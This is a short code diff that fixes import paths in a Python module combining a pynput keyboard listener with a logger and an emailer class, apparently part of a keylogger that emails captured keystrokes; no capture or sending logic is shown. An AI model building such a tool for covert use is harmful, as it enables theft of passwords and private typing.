@@ -1,8 +1,8 @@
 from pynput.keyboard import Listener, Key
 import os
 
-from . import setlog
-from . import Emailer
+from .logger import setlog
+from .email import Emailer
 
 
 class CustomListener(Listener):
